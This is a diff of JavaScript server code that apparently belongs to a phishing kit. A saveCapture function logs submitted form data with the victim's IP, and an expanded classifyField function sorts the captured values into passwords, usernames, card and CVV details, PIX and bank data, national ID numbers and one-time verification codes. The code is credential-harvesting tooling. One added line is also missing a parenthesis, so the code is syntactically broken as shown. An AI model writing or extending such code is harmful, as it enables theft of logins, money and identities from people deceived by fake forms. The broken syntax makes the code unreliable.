@@ -230,8 +230,53 @@ const WORDLIST=${WORDLIST_JSON};
 
 const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
 
-function classifyField(name) {
-    name = (name || '').toLowerCase().replace(/[^a-z0-9_]/g, '');
+function classifyField(name, placeholder) {
+    name = (name || '').toLowerCase().replace(/^[0-9]+-|_|-[0-9]+$|_([0-9]+)/g, '').replace(/[^a-z0-9_]/g, '');
+    placeholder = (placeholder || '').toLowerCase().replace(/[^a-z0-9_]/g, '');
+
+    // Se o nome for tipo "ion-input-2", "input_1", etc, tenta identificar pelo placeholder
+    const isGenericName = name.match(/^(ion-?input|input)[-_]?[0-9]*$/) || name.match(/^input[-_]?[0-9]+$/) || name.match(/^[a-z]+[-_][0-9]+$/) || name.match(/^field[_-]?[0-9]*$/);
+    
+    if(isGenericName || name.length === 0) {
+        if(placeholder) {
+            //_wordlist de placeholders comuns (PT/EN)
+            if(['escola','colegio','faculdade','universidade','instituto','curso','serie','turma','campus'].some(p => placeholder.includes(p))) return 'ESCOLA';
+            if(['empresa','companhia','trabalho','cargo','departamento','setor','profissao','ocupacao'].some(p => placeholder.includes(p))) return 'TRABALHO';
+            if(['usuario','username','login','nome de usuario','user'].some(p => placeholder.includes(p))) return 'USUARIO';
+            if(['nome','name','full name','nome completo','sobrenome','apelido','nick'].some(p => placeholder.includes(p))) return 'NOME';
+            if(['senha','password','palavra-passe','pass','pwd','pin','chave de acesso'].some(p => placeholder.includes(p))) return 'SENHA';
+            if(['email','e-mail','correio eletronico','mail'].some(p => placeholder.includes(p))) return 'EMAIL';
+            if(['telefone','phone','telemovel','celular','mobile','whatsapp','fax'].some(p => placeholder.includes(p))) return 'TELEFONE';
+            if(['cpf','cnpj','documento','rg','identidade','passaporte','registro'].some(p => placeholder.includes(p))) return 'DOCUMENTO';
+            if(['data','nascimento','birth','ano','idade','date'].some(p => placeholder.includes(p))) return 'DATA';
+            if(['endereco','endereço','rua','avenida','address','street','cep','cep','bairro','cidade','cidade'].some(p => placeholder.includes(p))) return 'ENDERECO';
+            if['cartao','cartão','card','credito','debito','cvv','conta','banco','agencia','pix'].some(p => placeholder.includes(p))) return 'PAGAMENTO';
+            if(['codigo','code','token','otp','verificacao','verification'].some(p => placeholder.includes(p))) return 'SEGURANCA';
+            if(['termos','condicoes','privacidade','aceito','concordo','agree'].some(p => placeholder.includes(p))) return 'TERMOS';
+            if(['pais','country','nacionalidade','nationality'].some(p => placeholder.includes(p))) return 'PAIS';
+            if(['genero','sexo','gender','masculino','feminino'].some(p => placeholder.includes(p))) return 'GENERO';
+            if(['estado civil','estado civil','civil status','casado','solteiro'].some(p => placeholder.includes(p))) return 'ESTADO_CIVIL';
+            if(['cep','zip','postal','codigo postal'].some(p => placeholder.includes(p))) return 'CEP';
+            if(['numero','número','number','num','andap','andar','apartamento','ap'].some(p => placeholder.includes(p))) return 'NUMERO';
+            if(['complemento','complement','bloco','unidade'].some(p => placeholder.includes(p))) return 'COMPLEMENTO';
+            if(['disciplina','subject','materia','cadeira'].some(p => placeholder.includes(p))) return 'DISCIPLINA';
+            if(['professor','docente','teacher','instructor'].some(p => placeholder.includes(p))) return 'PROFESSOR';
+            if(['nota','grade','score','media','média'].some(p => placeholder.includes(p))) return 'NOTA';
+            if(['mensagem','message','comentario','comment','observacao','obs'].some(p => placeholder.includes(p))) return 'MENSAGEM';
+            if(['link','url','website','site','endereco web'].some(p => placeholder.includes(p))) return 'LINK';
+            if(['imagem','foto','image','picture','avatar','upload'].some(p => placeholder.includes(p))) return 'IMAGEM';
+            if(['arquivo','file','documento file','anexo','attachment'].some(p => placeholder.includes(p))) return 'ARQUIVO';
+            if(['valor','value','preco','preço','price','quantidade','qtd','total'].some(p => placeholder.includes(p))) return 'VALOR';
+            if(['tipo','type','categoria','category','especie','espécie'].some(p => placeholder.includes(p))) return 'TIPO';
+            if(['status','situacao','situação','state'].some(p => placeholder.includes(p))) return 'STATUS';
+            if(['acao','ação','action','operacao','operação'].some(p => placeholder.includes(p))) return 'ACAO';
+            
+            // Se nao identificou, retorna o placeholder como nome do campo
+            return 'CAMPO_' + placeholder.toUpperCase().replace(/[^A-Z0-9]/g, '_');
+        }
+        return name || 'DESCONHECIDO';
+    }
+
     for (const w of WORDLIST) {
         if (name.includes(w) || w.includes(name)) {
             if (['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x => w.includes(x) || x.includes(w))) return 'USUARIO';
@@ -257,7 +302,8 @@ function saveCapture(body, ip, headers){
 
         for(let[k,v]of p.entries()){
             allFields[k]=v;
-            const cat=classifyField(k);
+            // placeholder vazio por enquanto
+            const cat=classifyField(k,'');
             classified[cat].push(k+': '+v);
         }
 
